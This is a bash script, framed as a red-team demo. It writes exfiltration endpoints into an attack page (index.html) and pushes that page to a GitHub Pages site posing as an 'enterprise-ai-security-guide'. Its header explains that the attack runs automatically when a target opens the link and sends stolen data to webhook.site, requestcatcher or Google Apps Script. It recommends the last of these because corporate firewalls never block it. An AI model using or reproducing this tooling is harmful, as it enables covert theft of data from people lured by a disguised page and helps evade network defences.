#!/bin/bash
# ============================================================================
# Red Team Demo Setup Script
# ============================================================================
# Configure one or more exfiltration endpoints in the attack page.
#
# USAGE:
#   ./setup.sh --webhook "https://webhook.site/YOUR-ID"
#   ./setup.sh --reqcatch "https://YOUR-NAME.requestcatcher.com/exfil"
#   ./setup.sh --google "https://script.google.com/macros/s/YOUR-ID/exec"
#   ./setup.sh --reqcatch "URL" --google "URL"   # multiple at once
#
# SERVICES:
#   webhook.site     — Easy but often blocked by corporate firewalls
#   requestcatcher   — No login: open YOUR-NAME.requestcatcher.com to watch
#   Google Apps Script — script.google.com, NEVER blocked by firewalls
#
# DEMO FLOW:
#   - Set your endpoint(s) using this script
#   - Share https://nishantshekhar2.github.io/enterprise-ai-security-guide/
#   - Target opens it, attack runs automatically
#   - Stolen data appears at your endpoint(s) AND on the target's screen
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WEBHOOK=""
REQCATCH=""
GOOGLE=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --webhook)  WEBHOOK="$2"; shift 2;;
    --reqcatch) REQCATCH="$2"; shift 2;;
    --google)   GOOGLE="$2"; shift 2;;
    *)
      # Legacy: single argument = webhook URL
      if [[ -z "$WEBHOOK" && "$1" == http* ]]; then
        WEBHOOK="$1"; shift
      else
        echo "Unknown option: $1"; exit 1
      fi
      ;;
  esac
done

if [[ -z "$WEBHOOK" && -z "$REQCATCH" && -z "$GOOGLE" ]]; then
  echo "Usage: ./setup.sh [OPTIONS]"
  echo ""
  echo "Options:"
  echo "  --webhook URL     webhook.site endpoint"
  echo "  --reqcatch URL    requestcatcher.com endpoint"
  echo "  --google URL      Google Apps Script endpoint"
  echo ""
  echo "Examples:"
  echo "  ./setup.sh --webhook 'https://webhook.site/abc-123'"
  echo "  ./setup.sh --reqcatch 'https://myname.requestcatcher.com/exfil'"
  echo "  ./setup.sh --google 'https://script.google.com/macros/s/AKfycbx.../exec'"
  echo "  ./setup.sh --reqcatch 'URL1' --google 'URL2'   # both at once"
  echo ""
  echo "Quick setup (no-login services):"
  echo "  1. requestcatcher.com — pick a name, open it in browser, done"
  echo "  2. webhook.site — open it, copy URL"
  echo "  3. Google Apps Script — see SETUP_GOOGLE_EXFIL.md (firewall-proof)"
  exit 1
fi

FILE="$SCRIPT_DIR/index.html"

if [[ -n "$WEBHOOK" ]]; then
  echo "[*] Setting webhook.site endpoint: $WEBHOOK"
  sed -i '' "s|const EXFIL_ENDPOINT = \".*\";|const EXFIL_ENDPOINT = \"${WEBHOOK}\";|" "$FILE"
fi

if [[ -n "$REQCATCH" ]]; then
  echo "[*] Setting requestcatcher endpoint: $REQCATCH"
  sed -i '' "s|const EXFIL_REQCATCH = \".*\";|const EXFIL_REQCATCH = \"${REQCATCH}\";|" "$FILE"
fi

if [[ -n "$GOOGLE" ]]; then
  echo "[*] Setting Google Apps Script endpoint: $GOOGLE"
  sed -i '' "s|const EXFIL_GOOGLE = \".*\";|const EXFIL_GOOGLE = \"${GOOGLE}\";|" "$FILE"
fi

echo "[*] Updated index.html"

# Commit and push
cd "$SCRIPT_DIR"
git add index.html
git commit -m "Configure exfiltration endpoint(s)"
git push origin main

echo ""
echo "[+] Done! GitHub Pages will update in ~30 seconds."
echo ""
echo "TARGET URL:"
echo "  https://nishantshekhar2.github.io/enterprise-ai-security-guide/"
echo ""
if [[ -n "$REQCATCH" ]]; then
  WATCH_URL="${REQCATCH%%/exfil*}"
  echo "MONITOR (requestcatcher):"
  echo "  Open ${WATCH_URL} in your browser to watch incoming data"
  echo ""
fi
if [[ -n "$WEBHOOK" ]]; then
  echo "MONITOR (webhook.site):"
  echo "  Open ${WEBHOOK/webhook.site/webhook.site/#!/} in your browser"
  echo ""
fi
